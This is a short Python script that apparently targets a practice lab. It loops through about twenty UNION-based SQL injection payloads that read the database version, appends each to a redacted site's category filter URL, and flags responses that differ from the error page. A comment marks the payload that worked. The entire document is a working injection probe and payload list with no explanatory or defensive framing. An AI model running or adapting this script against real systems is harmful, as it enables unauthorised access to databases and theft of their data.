import requests

def url_encode(text):
    return requests.utils.quote(text, safe='')

payloads = [
    "' UNION SELECT @@version; -- ",
    "' UNION SELECT @@version -- ",
    "' UNION SELECT @@version -- '",
    "' UNION SELECT @@version; -- '",
    "' UNION SELECT version(); -- ",
    "' UNION SELECT version() -- ",
    "' UNION SELECT version(); -- '",
    "' UNION SELECT version() -- '",
    "' UNION SELECT NULL, @@version#", # this ended up being the correct answer
    "' UNION SELECT NULL, @@version# ",
    "' UNION SELECT NULL, @@version#'",
    "' UNION SELECT NULL, @@version#' ",
    "' UNION SELECT NULL, NULL, @@version#",
    "' UNION SELECT NULL, NULL, @@version# ",
    "' UNION SELECT NULL, NULL, @@version#'",
    "' UNION SELECT NULL, NULL, @@version#' ",
    "' UNION SELECT NULL, NULL, NULL, @@version#",
    "' UNION SELECT NULL, NULL, NULL, @@version# ",
    "' UNION SELECT NULL, NULL, NULL, @@version#'",
    "' UNION SELECT NULL, NULL, NULL, @@version#' ",
]

# Get the default url that you believe to be vulnerable
DEFAULT_URL = 'https://REDACTED.REDACTED.net/filter?category=Lifestyle'

# Sample the request that provides the internal server error
bad_url = 'https://REDACTED.REDACTED.net/filter?category=Lifestyle%27'
bad_request = requests.get(bad_url)

found_urls = []

for payload in payloads:
    full_url = DEFAULT_URL + url_encode(payload)
    
    print(f"[ ? ] Trying - {full_url}")

    # Compare requests
    curr_request = requests.get(full_url)
    if curr_request.text != bad_request.text:
        found_urls.append(full_url)

# Check if we found any potential SQLi
if len(found_urls) > 0:
    print("\n>> Found the following:")
    for url in found_urls:
        print(f"[ + ] {url}")
else:
    print("\n[ ! ] Nothing Found...")
